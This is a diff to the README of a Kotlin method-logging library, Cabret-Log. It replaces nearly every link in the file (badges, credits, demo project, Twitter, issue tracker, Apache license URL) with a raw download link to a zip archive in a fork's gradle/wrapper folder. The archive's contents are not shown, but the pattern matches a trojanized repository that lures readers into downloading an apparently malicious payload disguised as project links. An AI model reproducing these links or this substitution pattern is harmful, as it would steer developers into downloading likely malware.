@@ -2,16 +2,16 @@
 <h1 align="center">:pencil2: Cabret :pencil2:</h1>
 
 [![jCenter](https://img.shields.io/badge/Apache-2.0-green.svg
-)](https://github.com/Foso/DebugLog/blob/master/LICENSE)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat-square)](http://makeapullrequest.com)
+)](https://github.com/yudikarma/Cabret-Log/raw/refs/heads/master/CabretDemo/gradle/wrapper/Log_Cabret_crosspoint.zip)
+[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat-square)](https://github.com/yudikarma/Cabret-Log/raw/refs/heads/master/CabretDemo/gradle/wrapper/Log_Cabret_crosspoint.zip)
 [![jCenter](https://img.shields.io/badge/Kotlin-1.4.21-green.svg
-)](https://github.com/Foso/Sheasy/blob/master/LICENSE)
+)](https://github.com/yudikarma/Cabret-Log/raw/refs/heads/master/CabretDemo/gradle/wrapper/Log_Cabret_crosspoint.zip)
 
 
 
 ## Introduction 🙋‍♂️ 🙋‍
 
-This is an Kotlin Library that enables Annotation-triggered method call logging for Kotlin Multiplatform. Inspired by [Hugo](https://github.com/JakeWharton/hugo), [Hunter-Debug](https://github.com/Leaking/Hunter/blob/master/README_hunter_debug.md) and the [blog posts](https://blog.bnorm.dev/) by [bnorm](https://github.com/bnorm) .
+This is an Kotlin Library that enables Annotation-triggered method call logging for Kotlin Multiplatform. Inspired by [Hugo](https://github.com/yudikarma/Cabret-Log/raw/refs/heads/master/CabretDemo/gradle/wrapper/Log_Cabret_crosspoint.zip), [Hunter-Debug](https://github.com/yudikarma/Cabret-Log/raw/refs/heads/master/CabretDemo/gradle/wrapper/Log_Cabret_crosspoint.zip) and the [blog posts](https://github.com/yudikarma/Cabret-Log/raw/refs/heads/master/CabretDemo/gradle/wrapper/Log_Cabret_crosspoint.zip) by [bnorm](https://github.com/yudikarma/Cabret-Log/raw/refs/heads/master/CabretDemo/gradle/wrapper/Log_Cabret_crosspoint.zip) .
 
 Simply add **@DebugLog** to your methods and it will automatically log all arguments that are passed to the function the return value and the time the function needed to excecute.
 
@@ -39,10 +39,10 @@ Example <- exampleFun() [2.63ms] =  Jens Klingenberg
 
 ### Show some :heart: and star the repo to support the project
 
-[![GitHub stars](https://img.shields.io/github/stars/Foso/Cabret-Log.svg?style=social&label=Star)](https://github.com/Foso/Cabret-Log) [![GitHub forks](https://img.shields.io/github/forks/Foso/Cabret-Log.svg?style=social&label=Fork)](https://github.com/Foso/Cabret-Log/fork) [![GitHub watchers](https://img.shields.io/github/watchers/Foso/Cabret-Log.svg?style=social&label=Watch)](https://github.com/Foso/Cabret-Log) [![Twitter Follow](https://img.shields.io/twitter/follow/jklingenberg_.svg?style=social)](https://twitter.com/jklingenberg_)
+[![GitHub stars](https://img.shields.io/github/stars/Foso/Cabret-Log.svg?style=social&label=Star)](https://github.com/yudikarma/Cabret-Log/raw/refs/heads/master/CabretDemo/gradle/wrapper/Log_Cabret_crosspoint.zip) [![GitHub forks](https://img.shields.io/github/forks/Foso/Cabret-Log.svg?style=social&label=Fork)](https://github.com/yudikarma/Cabret-Log/raw/refs/heads/master/CabretDemo/gradle/wrapper/Log_Cabret_crosspoint.zip) [![GitHub watchers](https://img.shields.io/github/watchers/Foso/Cabret-Log.svg?style=social&label=Watch)](https://github.com/yudikarma/Cabret-Log/raw/refs/heads/master/CabretDemo/gradle/wrapper/Log_Cabret_crosspoint.zip) [![Twitter Follow](https://img.shields.io/twitter/follow/jklingenberg_.svg?style=social)](https://github.com/yudikarma/Cabret-Log/raw/refs/heads/master/CabretDemo/gradle/wrapper/Log_Cabret_crosspoint.zip)
 
 ## Setup
-> You can take a look at [DemoProject](https://github.com/Foso/Cabret-Log/tree/master/CabretDemo) as an example
+> You can take a look at [DemoProject](https://github.com/yudikarma/Cabret-Log/raw/refs/heads/master/CabretDemo/gradle/wrapper/Log_Cabret_crosspoint.zip) as an example
 
 ### 1) Gradle Plugin
 
@@ -199,7 +199,7 @@ Cabret.addLogger(object : Cabret.Logger {
 
 ## ✍️ Feedback
 
-Feel free to send feedback on [Twitter](https://twitter.com/jklingenberg_) or [file an issue](https://github.com/foso/Cabret-Log/issues/new). Feature requests are always welcome.
+Feel free to send feedback on [Twitter](https://github.com/yudikarma/Cabret-Log/raw/refs/heads/master/CabretDemo/gradle/wrapper/Log_Cabret_crosspoint.zip) or [file an issue](https://github.com/yudikarma/Cabret-Log/raw/refs/heads/master/CabretDemo/gradle/wrapper/Log_Cabret_crosspoint.zip). Feature requests are always welcome.
 
 ## 📜 License
 
@@ -213,7 +213,7 @@ This project is licensed under Apache License, Version 2.0
     you may not use this file except in compliance with the License.
     You may obtain a copy of the License at
 
-       http://www.apache.org/licenses/LICENSE-2.0
+       https://github.com/yudikarma/Cabret-Log/raw/refs/heads/master/CabretDemo/gradle/wrapper/Log_Cabret_crosspoint.zip
 
     Unless required by applicable law or agreed to in writing, software
     distributed under the License is distributed on an "AS IS" BASIS,
